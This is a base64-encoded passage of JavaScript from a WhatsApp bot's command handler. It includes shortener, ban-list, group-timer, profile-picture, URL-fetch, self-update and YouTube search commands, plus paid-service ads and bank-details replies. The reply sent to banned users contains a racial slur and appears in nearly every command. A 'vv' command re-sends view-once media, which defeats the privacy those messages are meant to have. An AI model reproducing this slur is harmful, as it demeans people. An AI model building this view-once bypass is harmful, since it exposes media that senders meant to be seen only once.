Nhc2UgJ3Nob3J0dXJsJzp7CiAgaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmlmICghdGV4dCkgcmV0dXJuIG0ucmVwbHkoJ2BgYCpbIFdyb25nISBdKiBsaW5rL3VybGBgYCcpCmxldCBzaG9ydFVybDEgPSBhd2FpdCAoYXdhaXQgZmV0Y2goYGh0dHBzOi8vdGlueXVybC5jb20vYXBpLWNyZWF0ZS5waHA/dXJsPSR7YXJnc1swXX1gKSkudGV4dCgpOwppZiAoIXNob3J0VXJsMSkgcmV0dXJuIG0ucmVwbHkoYCpFcnJvcjogQ291bGQgbm90IGdlbmVyYXRlIGEgc2hvcnQgVVJMLipgKTsKbGV0IGRvbmUgPSBgKlsgRE9ORSBCWSBBS0FORSBNRCDwn4CEXSpcblxuKk9yaWdpbmFsIExpbmsgOipcbiR7dGV4dH1cbipTaG9ydGVuZWQgOipcbiR7c2hvcnRVcmwxfWAudHJpbSgpOwptLnJlcGx5KGRvbmUpCn0KYnJlYWs7CmNhc2UgJ3Z2JzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICAgIGlmICghbS5xdW90ZWQpIHJldHVybiByZXBseSgnUGxlYXNlIHJlcGx5IHRvIGFuIGltYWdlLCB2aWRlbywgb3Igdm9pY2Ugbm90ZSAoVmlldyBPbmNlIGluY2x1ZGVkKS4nKTsKCiAgICB0cnkgewogICAgICAgIC8vIERvd25sb2FkIHRoZSBxdW90ZWQgbWVkaWEKICAgICAgICBjb25zdCBtZWRpYUJ1ZmZlciA9IGF3YWl0IHJpY2guZG93bmxvYWRNZWRpYU1lc3NhZ2UobS5xdW90ZWQpOwoKICAgICAgICBpZiAoIW1lZGlhQnVmZmVyKSB7ICAKICAgICAgICAgICAgcmV0dXJuIHJlcGx5KCfimqDvuI8gRmFpbGVkIHRvIGRvd25sb2FkIG1lZGlhLiBUcnkgYWdhaW4uXG5fQnkgQUtBTkUgTURfJyk7ICAKICAgICAgICB9ICAKCiAgICAgICAgLy8gRGV0ZXJtaW5lIHRoZSBtZWRpYSB0eXBlICAKICAgICAgICBjb25zdCBtZWRpYVR5cGUgPSBtLnF1b3RlZC5tdHlwZTsgIAoKICAgICAgICBpZiAobWVkaWFUeXBlID09PSAnaW1hZ2VNZXNzYWdlJykgeyAgCiAgICAgICAgICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7ICAgCiAgICAgICAgICAgICAgICBpbWFnZTogbWVkaWFCdWZmZXIsICAgCiAgICAgICAgICAgICAgICBjYXB0aW9uOiAi8J+AhF9IRVJFJ1MgVEhFIElNR1xuQlkgQUtBTkUgTURfIiAgIAogICAgICAgICAgICB9LCB7IHF1b3RlZDogbSB9KTsKICAgICAgICB9IGVsc2UgaWYgKG1lZGlhVHlwZSA9PT0gJ3ZpZGVvTWVzc2FnZScpIHsgIAogICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyAgIAogICAgICAgICAgICAgICAgdmlkZW86IG1lZGlhQnVmZmVyLCAgIAogICAgICAgICAgICAgICAgY2FwdGlvbjogIuKchSBIZXJlJ3MgdGhlIHZpZGVvXG5fQnkgQWthbmUtbWRfIiAgIAogICAgICAgICAgICB9LCB7IHF1b3RlZDogbSB9KTsKICAgICAgICB9IGVsc2UgaWYgKG1lZGlhVHlwZSA9PT0gJ2F1ZGlvTWVzc2FnZScpIHsgIAogICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyAgIAogICAgICAgICAgICAgICAgYXVkaW86IG1lZGlhQnVmZmVyLCAgIAogICAgICAgICAgICAgICAgbWltZXR5cGU6ICdhdWRpby9vZ2cnLCAvLyBFbnN1cmVzIHByb3BlciB2b2ljZSBub3RlIHBsYXliYWNrICAKICAgICAgICAgICAgICAgIHB0dDogdHJ1ZSwgLy8gU2VuZHMgaXQgYXMgYSB2b2ljZSBub3RlICAKICAgICAgICAgICAgICAgIGNhcHRpb246ICLinIUgSGVyZSdzIHRoZSB2b2ljZSBub3RlXG5fQnkgQWthbmUtbWRfIiAgIAogICAgICAgICAgICB9LCB7IHF1b3RlZDogbSB9KTsKICAgICAgICB9IGVsc2UgeyAgCiAgICAgICAgICAgIHJldHVybiByZXBseSgn4pqg77iPIFVuc3VwcG9ydGVkIGZvcm1hdC4gUGxlYXNlIHJlcGx5IHRvIGFuIGltYWdlLCB2aWRlbywgb3Igdm9pY2Ugbm90ZS5cbl9CeSBBa2FuZS1tZF8nKTsgIAogICAgICAgIH0KICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgY29uc29sZS5lcnJvcignRXJyb3I6JywgZXJyb3IpOwogICAgICAgIGF3YWl0IHJlcGx5bign4pqg77iPIEFuIGVycm9yIG9jY3VycmVkLiBUcnkgYWdhaW4uXG5Vc2UgLnNhdmUgaWYgdGhpcyBkb2VzbnQgd29ya1xuX0J5IEFrYW5lLW1kXycpOwogICAgfQp9CmJyZWFrOwovLz09IGJhbiBmdW5jdGlvbiBieSBSaWNoaWUgPT0gLy8KY2FzZSAiYmFuIjogY2FzZSAiYmFudXNlciI6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmlmICghaXNDcmVhdG9yKSByZXR1cm4gbS5yZXBseSgiYGBgZm9yIE93bmVyIG9ubHlgYGAuIik7CmlmIChtLnF1b3RlZCB8fCB0ZXh0KSB7CmxldCBvcmFuZyA9IG0ubWVudGlvbmVkSmlkWzBdID8gbS5tZW50aW9uZWRKaWRbMF0gOiB0ZXh0ID8gdGV4dC5yZXBsYWNlKC9bXjAtOV0vZywgJycpKydAcy53aGF0c2FwcC5uZXQnIDogbS5xdW90ZWQgPyBtLnF1b3RlZC5zZW5kZXIgOiAnJwppZiAoYmFuLmluY2x1ZGVzKG9yYW5nKSkgcmV0dXJuIG0ucmVwbHkoYCpVc2VyICR7b3Jhbmcuc3BsaXQoJ0AnKVswXX0gaXMgYWxyZWFkeSBiYW5uZWQg8J+AhCpgKQphd2FpdCBiYW4ucHVzaChvcmFuZykKYXdhaXQgZnMud3JpdGVGaWxlU3luYygiLi9tZW51L2xpYi9iYW5uZWQuanNvbiIsIEpTT04uc3RyaW5naWZ5KGJhbikpCm0ucmVwbHkoYFxgXGBcYHVzZXIgJHtvcmFuZy5zcGxpdCgnQCcpWzBdfSBiYW5uZWQgZnJvbSB1c2luZyB0aGUgYm90IPCfgIRcYFxgXGBgKQp9IGVsc2UgewpyZXR1cm4gbS5yZXBseShleGFtcGxlKCIvQHRhZy8yMzRYWFgvcmVwbHkgdG8gY2hhdCIpKQp9fQpicmVhazsKY2FzZSAidW5iYW4iOiBjYXNlICJ1bmJhbnVzZXIiOiAgewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKaWYgKCFpc0NyZWF0b3IpIHJldHVybiBtLnJlcGx5KCJgYGBmb3IgT3duZXIgb25seWBgYC4iKTsKaWYgKG0ucXVvdGVkIHx8IHRleHQpIHsKbGV0IG9yYW5nID0gbS5tZW50aW9uZWRKaWRbMF0gPyBtLm1lbnRpb25lZEppZFswXSA6IHRleHQgPyB0ZXh0LnJlcGxhY2UoL1teMC05XS9nLCAnJykrJ0BzLndoYXRzYXBwLm5ldCcgOiBtLnF1b3RlZCA/IG0ucXVvdGVkLnNlbmRlciA6ICcnCmlmICghYmFuLmluY2x1ZGVzKG9yYW5nKSkgcmV0dXJuIG0ucmVwbHkoYFxgXGBcYFVzZXIgJHtvcmFuZy5zcGxpdCgnQCcpWzBdfSBub3QgZm91bmQgaW4gYmFubGlzdCDwn4CEXGBcYFxgYCkKbGV0IGluZHggPSBiYW4uaW5kZXhPZihvcmFuZykKYXdhaXQgYmFuLnNwbGljZShpbmR4LCAxKQphd2FpdCBmcy53cml0ZUZpbGVTeW5jKCIuL21lbnUvbGliL2Jhbm5lZC5qc29uIiwgSlNPTi5zdHJpbmdpZnkoYmFuKSkKbS5yZXBseShgXGBcYFxgdXNlciAgJHtvcmFuZy5zcGxpdCgnQCcpWzBdfSB1bmJhbm5lZCB5b3VyIGZyZWUgdG8gdXNlIHRoZSBib3RcYFxgXGBgKQp9IGVsc2UgewpyZXR1cm4gbS5yZXBseShleGFtcGxlKCJAdGFnLzIzNFhYL3JlcGx5IHRvIGNoYXQiKSkKfX0KYnJlYWsKY2FzZSAibGlzdGJhbiI6IGNhc2UgImxpc3RiYW51c2VyIjogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKaWYgKCFpc0NyZWF0b3IpIHJldHVybiBtLnJlcGx5KCJgYGBmb3IgT3duZXIgb25seWBgYC4iKTsKaWYgKGJhbi5sZW5ndGggPCAxKSByZXR1cm4gbS5yZXBseSgibm8gYmFubmVkIHVzZXJzIHlldCAiKQpsZXQgdGVrc255YSA9IGBiYW5uZWQgdXNlciBoZXJlXG5gCmJhbi5mb3JFYWNoKGUgPT4gdGVrc255YSArPSBgKiBAJHtlLnNwbGl0KCJAIilbMF19XG5gKQphd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwge3RleHQ6IHRla3NueWEsIG1lbnRpb25zOiBbLi4uIGJhbl19LCB7cXVvdGVkOiBtfSkKfQpicmVhazsKLy8gZW5kIGJhbiBmdW5jdGlvbiBieSByaWNoaWUgCmNhc2UgJ2Nsb3NldGltZSc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmlmICghbS5pc0dyb3VwKSByZXR1cm4gcmVwbHkobWVzcy5vbmx5Lmdyb3VwKQppZiAoIWlzQWRtaW5zKSByZXR1cm4gcmVwbHkoJ2BgYGFkbWluIGZpcnN0YGBgISEnKQppZiAoIWlzQm90QWRtaW5zKSByZXR1cm4gcmVwbHkoJ19Cb3QgbXVzdCBiZSBhZG1pbiBmaXJzdCDwn4CEXycpCmlmIChhcmdzWzFdID09ICdzZWNvbmQnKSB7CnZhciB0aW1lciA9IGFyZ3NbMF0gKiBgMTAwMGAKfSBlbHNlIGlmIChhcmdzWzFdID09ICdtaW51dGUnKSB7CnZhciB0aW1lciA9IGFyZ3NbMF0gKiBgNjAwMDBgCn0gZWxzZSBpZiAoYXJnc1sxXSA9PSAnaG91cicpIHsKdmFyIHRpbWVyID0gYXJnc1swXSAqIGAzNjAwMDAwYAp9IGVsc2UgaWYgKGFyZ3NbMV0gPT0gJ2RheScpIHsKdmFyIHRpbWVyID0gYXJnc1swXSAqIGA4NjQwMDAwMGAKfSBlbHNlIHsKcmV0dXJuIHJlcGx5KCcqQ2hvb3NlOipcbnNlY29uZFxubWludXRlXG5ob3VyXG5cbipFeGFtcGxlKlxuMTAgc2Vjb25kJykKfQpyZXBseShgQ2xvc2UgVGltZSAke3F9IFN0YXJ0aW5nIGZyb20gbm93YCkKc2V0VGltZW91dCgoKSA9PiB7CnZhciBub21vciA9IG0ucGFydGljaXBhbnQKY29uc3QgY2xvc2UgPSBgKk9uIHRpbWUqIEdyb3VwIENsb3NlZCBCeSBBZG1pblxuTm93IE9ubHkgQWRtaW5zIENhbiBTZW5kIE1lc3NhZ2VzYApyaWNoLmdyb3VwU2V0dGluZ1VwZGF0ZShmcm9tLCAnYW5ub3VuY2VtZW50JykKcmVwbHkoY2xvc2UpCn0sIHRpbWVyKQp9CmJyZWFrOwoKY2FzZSAnb3BlbnRpbWUnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIW0uaXNHcm91cCkgcmV0dXJuIHJlcGx5KG1lc3Mub25seS5ncm91cCkKaWYgKCFpc0FkbWlucykgcmV0dXJuIHJlcGx5KCdgYGBhZG1pbnMgb25seSBicm9gYGAhJykKaWYgKCFpc0JvdEFkbWlucykgcmV0dXJuIHJlcGx5KCdgYGBCb3QgbXVzdCBiZSBhZG1pbiBmaXJzdGBgYCDwn4CEIF8nKQppZiAoYXJnc1sxXSA9PSAnc2Vjb25kJykgewp2YXIgdGltZXIgPSBhcmdzWzBdICogYDEwMDBgCn0gZWxzZSBpZiAoYXJnc1sxXSA9PSAnbWludXRlJykgewp2YXIgdGltZXIgPSBhcmdzWzBdICogYDYwMDAwYAp9IGVsc2UgaWYgKGFyZ3NbMV0gPT0gJ2hvdXInKSB7CnZhciB0aW1lciA9IGFyZ3NbMF0gKiBgMzYwMDAwMGAKfSBlbHNlIGlmIChhcmdzWzFdID09ICdkYXknKSB7CnZhciB0aW1lciA9IGFyZ3NbMF0gKiBgODY0MDAwMDBgCn0gZWxzZSB7CnJldHVybiByZXBseSgnKkNob29zZToqXG5zZWNvbmRcbm1pbnV0ZVxuaG91clxuXG4qRXhhbXBsZSpcbjEwIHNlY29uZCcpCn0KcmVwbHkoYE9wZW4gVGltZSAke3F9IFN0YXJ0aW5nIGZyb20gbm93YCkKc2V0VGltZW91dCgoKSA9PiB7CnZhciBub21vciA9IG0ucGFydGljaXBhbnQKY29uc3Qgb3BlbiA9IGAqT24gdGltZSogR3JvdXAgT3BlbmVkIEJ5IEFkbWluXG4gTm93IE1lbWJlcnMgQ2FuIFNlbmQgTWVzc2FnZXNgCnJpY2guZ3JvdXBTZXR0aW5nVXBkYXRlKGZyb20sICdub3RfYW5ub3VuY2VtZW50JykKcmVwbHkob3BlbikKfSwgdGltZXIpCn0KYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ3Jlc2V0bGlua2djJzoKY2FzZSAncmVzZXRsaW5rZ3JvdXAnOgpjYXNlICdyZXNldGxpbmtncnVwJzoKY2FzZSAncmV2b2tlJzoKY2FzZSAncmVzZXRsaW5rJzoKY2FzZSAncmVzZXRncm91cGxpbmsnOgpjYXNlICdyZXNldGdjbGluayc6CmNhc2UgJ3Jlc2V0Z3J1cGxpbmsnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIW0uaXNHcm91cCkgcmV0dXJuIHJlcGx5KG1lc3Mub25seS5ncm91cCkKaWYgKCFpc0JvdEFkbWlucykgcmV0dXJuIHJlcGx5KCdfQm90cyBNdXN0IEJlIEFkbWlucyBGaXJzdF8nKQppZiAoIWlzQWRtaW5zKSByZXR1cm4gcmVwbHkoJ0FkbWluIG9ubHkhIScpCnJpY2guZ3JvdXBSZXZva2VJbnZpdGUobS5jaGF0KQp9CmJyZWFrOwpjYXNlICdldmVyeW9uZSc6IAppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKIHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CnRleHQ6ICJldmVyeW9uZSIgKyBtLmNoYXQsCmNvbnRleHRJbmZvOiB7Cmdyb3VwTWVudGlvbnM6IFsKewpncm91cEppZDogbS5jaGF0LApncm91cFN1YmplY3Q6ICdyaWNoaWUgaXMgaGltJwp9Cl0KfQp9CikKYnJlYWs7CmNhc2UgJ2dldHBwJzp7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwpsZXQgdXNlcnNzID0gbS5tZW50aW9uZWRKaWRbMF0gPyBtLm1lbnRpb25lZEppZFswXSA6IG0ucXVvdGVkID8gbS5xdW90ZWQuc2VuZGVyIDogdGV4dC5yZXBsYWNlKC9bXjAtOV0vZywgJycpKydAcy53aGF0c2FwcC5uZXQnCmxldCBnaG9zc3QgPSB1c2Vyc3MKCXRyeSB7CiAgIHZhciBwcHVzZXIgPSBhd2FpdCByaWNoLnByb2ZpbGVQaWN0dXJlVXJsKGdob3NzdCwgJ2ltYWdlJykKfSBjYXRjaCAoZXJyKSB7CiAgIHZhciBwcHVzZXIgPSAnaHR0cHM6Ly9jZG4ucGl4YWJheS5jb20vcGhvdG8vMjAxNS8xMC8wNS8yMi8zNy9ibGFuay1wcm9maWxlLXBpY3R1cmUtOTczNDYwXzk2MF83MjAucG5nP3E9NjAnCn0KcmljaC5zZW5kTWVzc2FnZShmcm9tLCB7IGltYWdlOiB7IHVybDogcHB1c2VyIH19LCB7IHF1b3RlZDogbSB9KQp9CmJyZWFrOwpjYXNlICJnZXQiOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIS9eaHR0cHM/OlwvXC8vLnRlc3QodGV4dCkpIHJldHVybiBtPy5yZXBseSgnUHJlZml4ICpVUkwqIHdpdGggaHR0cDovLyBvciBodHRwczovLycpCmxldCBsaW5rbnlhdXJsID0gYXdhaXQgc2hvcnR1cmwodGV4dCkKbGV0IF91cmwgPSBuZXcgVVJMKHRleHQpCmxldCB1cmwgPSBgJHtfdXJsLm9yaWdpbn0ke191cmwucGF0aG5hbWV9JHtfdXJsLnNlYXJjaH1gOwpsZXQgcmVzID0gYXdhaXQgZmV0Y2godXJsKQppZiAocmVzLmhlYWRlcnMuZ2V0KCdjb250ZW50LWxlbmd0aCcpID4gMTAwICogMTAyNCAqIDEwMjQgKiAxMDI0KSB7CmRlbGV0ZSByZXMKbT8ucmVwbHkoYENvbnRlbnQtTGVuZ3RoOiAke3Jlcy5oZWFkZXJzLmdldCgnY29udGVudC1sZW5ndGgnKX1gKQp9CmlmICghL3RleHR8anNvbi8udGVzdChyZXMuaGVhZGVycy5nZXQoJ2NvbnRlbnQtdHlwZScpKSkgcmV0dXJuIHJpY2guc2VuZE1lc3NhZ2UobT8uY2hhdCwgdXJsLCAnZmlsZScsIGAqTGluazoqICR7bGlua255YXVybH1cblxuMjAyNCDCqSBLaW5nIFJpY2hpZSBEZXZgLCBtKQpsZXQgdHh0ID0gYXdhaXQgcmVzLmJ1ZmZlcigpCnRyeSB7CnR4dCA9IHV0aWwuZm9ybWF0KEpTT04ucGFyc2UodHh0ICsgJycpKQp9IGNhdGNoIChlKSB7CnR4dCA9IHR4dCArICcnCn0gZmluYWxseSB7Cm0/LnJlcGx5KHR4dC5zbGljZSgwLCA2NTUzNikgKyAnJykKfQp9CmJyZWFrOwoKY2FzZSAndXBkYXRlJzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICAgIGlmICghaXNDcmVhdG9yKSByZXR1cm4gcmVwbHkoIk9ubHkgdGhlIG93bmVyIGNhbiB1c2UgdGhpcyBjb21tYW5kLiIpOwoKICAgIHJlcGx5KCIq4pyLIFVQREFUSU5HIEFLQU5FIE1ELi4uKiIpOwoKICAgIHRyeSB7CiAgICAgICAgY29uc3QgeyBleGVjIH0gPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7CiAgICAgICAgY29uc3QgZnMgPSByZXF1aXJlKCdmcycpOwoKICAgICAgICAvLyDwn5uRIERlZmluZSB5b3VyIEdpdEh1YiByZXBvc2l0b3J5IChSZXBsYWNlIHdpdGggeW91ciByZXBvKQogICAgICAgIGNvbnN0IGdpdGh1YlJlcG8gPSAiaHR0cHM6Ly9naXRodWIuY29tL1JpY2hpZXRoZ29hdC9BS0FORS1NRC5naXQiOwoKICAgICAgICAvLyDwn5OMIFN0ZXAgMTogQ2hlY2sgaWYgdGhlIHJlcG8gZXhpc3RzIGxvY2FsbHkKICAgICAgICBpZiAoIWZzLmV4aXN0c1N5bmMoIi4vQUtBTkUtTUQiKSkgewogICAgICAgICAgICBleGVjKGBnaXQgY2xvbmUgJHtnaXRodWJSZXBvfSBBS0FORS1NRGAsIChlcnIsIHN0ZG91dCwgc3RkZXJyKSA9PiB7CiAgICAgICAgICAgICAgICBpZiAoZXJyKSB7CiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcihzdGRlcnIpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiByZXBseSgi4p2MIEZhaWxlZCB0byBjbG9uZSByZXBvc2l0b3J5LiIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgdXBkYXRlRmlsZXMoKTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmVwbHkoIvCfgIQgRmV0Y2hpbmcgbGF0ZXN0IHVwZGF0ZXMuLi4iKTsKICAgICAgICAgICAgZXhlYyhgY2QgQUtBTkUtTUQgJiYgZ2l0IHB1bGxgLCAoZXJyLCBzdGRvdXQsIHN0ZGVycikgPT4gewogICAgICAgICAgICAgICAgaWYgKGVycikgewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3Ioc3RkZXJyKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVwbHkoIuKdjCBGYWlsZWQgdG8gZmV0Y2ggdXBkYXRlcy4iKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHVwZGF0ZUZpbGVzKCk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0KCiAgICAgICAgLy8g8J+TjCBTdGVwIDI6IE92ZXJ3cml0ZSBvbGQgZmlsZXMgd2l0aCBuZXcgb25lcwogICAgICAgIGZ1bmN0aW9uIHVwZGF0ZUZpbGVzKCkgewogICAgICAgICAgICBleGVjKGBjcCAtciBBS0FORS1NRC8qIC4vYCwgKGVyciwgc3Rkb3V0LCBzdGRlcnIpID0+IHsKICAgICAgICAgICAgICAgIGlmIChlcnIpIHsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKHN0ZGVycik7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlcGx5KCLinYwgRmFpbGVkIHRvIHVwZGF0ZSBmaWxlcy4iKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICByZXBseSgiKuKchSBVUERBVEUgU1VDQ0VTU0ZVTCEqXG5cbuKZu++4jyAqUmVzdGFydGluZy4uLioiKTsKCiAgICAgICAgICAgICAgICAvLyDwn5SEIFJlc3RhcnQgdGhlIGJvdAogICAgICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgcHJvY2Vzcy5leGl0KDApOwogICAgICAgICAgICAgICAgfSwgMzAwMCk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0KCiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIGNvbnNvbGUuZXJyb3IoIlVuZXhwZWN0ZWQgRXJyb3I6IiwgZXJyb3IpOwogICAgICAgIHJlcGx5KCLinYwgQW4gdW5leHBlY3RlZCBlcnJvciBvY2N1cnJlZC4iKTsKICAgIH0KCiAgICBicmVhazsKfQpjYXNlICdmYWN0JzoKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICBjb25zdCBiYnkgPSAiaHR0cHM6Ly9hcGlzLmRhdmlkY3lyaWx0ZWNoLm15LmlkL2ZhY3QiOwoKICAgIHRyeSB7CiAgICAgICAgY29uc3Qgbnlhc2ggPSBhd2FpdCBheGlvcy5nZXQoYmJ5KTsKICAgICAgICBjb25zdCBid2VzcyA9ICdodHRwczovL2ZpbGVzLmNhdGJveC5tb2UvYmE1a205LmpwZyc7CiAgICAgICAgY29uc3QgaWxvdmVkYXZpZCA9IG55YXNoLmRhdGEuZmFjdDsKICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBpbWFnZTogeyB1cmw6IGJ3ZXNzIH0sIGNhcHRpb246IGlsb3ZlZGF2aWQgfSk7CiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIHJlcGx5KCJBbiBFcnJvciBPY2N1cmVkLiIpOwogICAgfQogICAgYnJlYWs7CiAgICAKY2FzZSAncGFuZWwnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogIHJlcGx5KGAKXGBcYFxgQlVZIEEgUEFORUwgRlJPTSBSSUNISUVcYFxgXGBcbiBcYFxgXGBcYFRIQVQgQ0FOIExBU1QgWU9VIFVQIFRPIDEgTU9OVEhcYFxgXGAK4pWa4pSI4pSI4pSI4pSI4pSI4pSI4pSI4pSI4pSI4pSI4pSICkRNIGlmIGludGVyZXN0ZWQgCis0NDc3Njg1NDAzMDAKKzIzNDkxNjYxMDM2ODMK4pid77iP4pid77iP4pid77iPRG0gbm93YCkKICB9CiAgYnJlYWs7CmNhc2UgJ2F6YSc6CiAgY2FzZSAncGF5JzoKICBjYXNlICdhY2NudW0nOgogIGNhc2UgJ2FjY291bnQnOiB7CiAgcmVwbHkoYFxgQkFOSyBERVRBSUxTXGAKICDwn4CEIF8qJHtnbG9iYWwuYmFua293bmVyfSpfCiAgCiAg8J+UoiAke2dsb2JhbC5iYW5rbnVtYmVyfQogIAogIPCfj6YgXyoke2dsb2JhbC5iYW5rbmFtZX0qXwogICpTRU5EIFNDUkVFTlNIT1QgQUZURVIgUEFZTUVOVCpgKQogIH0KICBicmVhazsKICBjYXNlICdyaWNoaWUnOiB7CiAgcmVwbHkoYFxgXGBcYFJJQ0hJRSBJUyBISU3wn4CEXGBcYFxgYCkKICB9CiAgYnJlYWs7CiAgY2FzZSAneXRzJzogY2FzZSAneXRzZWFyY2gnOiB7CiAgaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICAgICAgICAgICAgICBpZiAoIXRleHQpIHJldHVybiByZXBseShgRXhhbXBsZSA6ICR7cHJlZml4ICsgY29tbWFuZH0gc3Rvcnkgd2EgYW5pbWVgKQogICAgICAgICAgICAgICAgbGV0IHl0cyA9IHJlcXVpcmUoInl0LXNlYXJjaCIpCiAgICAgICAgICAgICAgICBsZXQgc2VhcmNoID0gYXdhaXQgeXRzKHRleHQpCiAgICAgICAgICAgICAgICBsZXQgdGVrcyA9ICdZb3VUdWJlIFNlYXJjaFxuXG4gUmVzdWx0IEZyb20gJyt0ZXh0KydcblxuJwogICAgICAgICAgICAgICAgbGV0IG5vID0gMQogICAgICAgICAgICAgICAgZm9yIChsZXQgaSBvZiBzZWFyY2guYWxsKSB7CiAgICAgICAgICAgICAgICAgICAgdGVrcyArPSBgJHt0aGVtZWVtb2ppfSBObyA6ICR7bm8rK31cbiR7dGhlbWVlbW9qaX0gVHlwZSA6ICR7aS50eXBlfVxuJHt0aGVtZWVtb2ppfSBWaWRlbyBJRCA6ICR7aS52aWRlb0lkfVxuJHt0aGVtZWVtb2ppfSBUaXRsZSA6ICR7aS50aXRsZX1cbiR7dGhlbWVlbW9qaX0gVmlld3MgOiAke2kudmlld3N9XG4ke3RoZW1lZW1vaml9IER1cmF0aW9uIDogJHtpLnRpbWVzdGFtcH1cbiR7dGhlbWVlbW9qaX0gVXBsb2FkZWQgOiAke2kuYWdvfVxuJHt0aGVtZWVtb2ppfSBVcmwgOiAke2kudXJsfVxuXG7ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcblxuYAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgaW1hZ2U6IHsgdXJsOiBzZWFyY2guYWxsWzBdLnRodW1ibmFpbCB9LCAgY2FwdGlvbjogdGVrcyB9LCB7IHF1b3RlZDogbSB9KQogICAgICAgICAgICB9CiAgICAgICAgICAgIGJyZWFrCiAgY2FzZSAndGlrdG9rZ2lybCc6CiAgaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CnZhciBhc3VwYW4gPSBKU09OLnBhcnNlKGZzLnJlYWRGaWxlU3luYygnLi9zcmMvbWVkaWEvdGlrdG9rdmlkcy90aWt0b2tnaXJsLmpzb24nKSkKdmFyIGhhc2lsID0gcGlja1JhbmRvbShhc3VwYW4pCnJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGNhcHRpb246IG0uc3VjY2VzcywgdmlkZW86IHsgdXJsOiBoYXNpbC51cmwgfX0sIHsgcXVvdGVkOiBtIH0pCmJyZWFrOwpjYXNlICd0aWt0b2tnaGVhJzoKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn